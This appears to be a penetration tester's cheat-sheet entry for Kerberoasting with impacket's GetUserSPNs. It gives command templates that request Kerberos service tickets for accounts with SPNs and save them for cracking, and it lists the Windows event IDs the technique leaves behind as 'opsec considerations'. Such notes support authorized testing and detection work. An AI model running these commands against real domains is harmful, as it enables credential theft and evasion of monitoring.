### source
https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/GetUserSPNs.py  

### get user with SPN set and request tickets (kerberoast)
```
impacket-GetUserSPNs -request <domain>/<user>:<password> -outputfile <file>
```

### query single account for available SPNs 
```
impacket-GetUserSPNs -request <domain>/<user>:<password> -request-user <user>
```

### opsec considerations - Windows Security Log Event IDs
```
-Logon (4624)
-Logoff (4634)
-Kerberos Authentication Service (4768)
-Kerberos Service Ticket Operations (4769)
-Credential Validation (4776)
```
